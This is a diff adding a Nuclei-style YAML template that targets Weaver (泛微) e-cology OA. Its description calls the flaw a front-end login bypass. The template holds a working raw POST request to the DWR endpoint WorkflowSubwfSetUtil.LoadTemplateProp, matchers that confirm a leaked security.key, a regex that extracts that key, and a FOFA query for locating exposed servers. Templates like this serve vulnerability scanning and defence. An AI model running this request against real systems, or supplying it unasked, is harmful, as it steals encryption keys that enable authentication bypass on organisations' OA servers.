@@ -1,0 +1,37 @@
+id: ecology-get-key
+
+info:
+  name: Ecology get key
+  author: proud
+  severity: high
+  description: |
+    泛微 e-cology 泛微OA前台登录绕过-获取加密key
+  metadata:
+    verified: true
+    fofa-query: app="泛微-协同办公OA" || app="Weaver-OA" || app="泛微-OA（e-cology）"
+  tags: weaver, login, bypass
+
+http:
+  - raw:
+      - |
+        POST /dwr/call/plaincall/?callCount=1&c0-id=1&c0-scriptName=WorkflowSubwfSetUtil&c0-methodName=LoadTemplateProp&batchId=a&c0-param0=string:mobilemode&scriptSessionId=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, 'dwr.engine._remoteHandleCallback')"
+          - "contains(body, 'security.key')"
+          - "!contains(body, 'security.key:null')"  
+        condition: and
+
+    extractors:
+      - type: regex
+        name: security_key
+        part: body
+        regex:
+          - "security\\.key[\\s:]+['\"]([^'\"]+)['\"]"  
+        group: 1
